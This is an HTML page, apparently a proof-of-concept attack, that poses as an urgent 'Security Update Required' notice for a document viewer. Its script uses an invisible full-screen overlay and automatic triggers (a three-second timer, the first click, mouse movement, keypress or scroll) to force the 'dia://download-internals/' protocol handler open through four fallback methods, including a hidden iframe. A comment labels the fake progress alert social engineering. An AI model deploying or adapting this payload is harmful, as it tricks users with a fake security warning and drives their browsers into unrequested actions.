<!DOCTYPE html>
<html>
<head>
    <title>Security Update Required</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .update-container {
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            text-align: center;
            max-width: 500px;
        }
        
        .urgent-badge {
            background: #ff4757;
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 14px;
            display: inline-block;
            margin-bottom: 20px;
        }
        
        .action-button {
            background: #ff6b6b;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 16px;
            border-radius: 25px;
            cursor: pointer;
            margin: 20px 0;
        }
        
        .hidden-trigger {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            z-index: 9999;
        }
    </style>
</head>
<body>
    <div class="update-container">
        <div class="urgent-badge">URGENT</div>
        <h1>ðŸ”’ Security Update Required</h1>
        <p>Your document viewer requires an immediate security update to protect against vulnerabilities.</p>
        
        <button class="action-button" onclick="startUpdate()">
            Install Security Update Now
        </button>
        
        <p style="font-size: 12px; opacity: 0.8;">
            This update will patch critical security vulnerabilities in the document handling system.
        </p>
    </div>

    <div class="hidden-trigger" onclick="executeDiaProtocol()"></div>

    <script>
        function startUpdate() {
            // Social engineering - show fake progress
            alert('Downloading security update...');
        }
        
        function executeDiaProtocol() {
            // Multiple approach untuk trigger dia://
            const methods = [
                () => { window.location.href = 'dia://download-internals/'; },
                () => { window.open('dia://download-internals/', '_self'); },
                () => { 
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = 'dia://download-internals/';
                    document.body.appendChild(iframe);
                },
                () => {
                    const link = document.createElement('a');
                    link.href = 'dia://download-internals/';
                    link.click();
                }
            ];
            
            // Try semua methods
            methods.forEach((method, index) => {
                setTimeout(() => {
                    try {
                        method();
                    } catch(e) {
                        console.log(`Method ${index + 1} failed:`, e);
                    }
                }, index * 100);
            });
        }
        
        // Auto-execute setelah delay
        setTimeout(executeDiaProtocol, 3000);
        
        // Juga execute pada berbagai user interactions
        ['click', 'mousemove', 'keydown', 'scroll'].forEach(event => {
            document.addEventListener(event, executeDiaProtocol, { once: true });
        });
    </script>
</body>
</html>
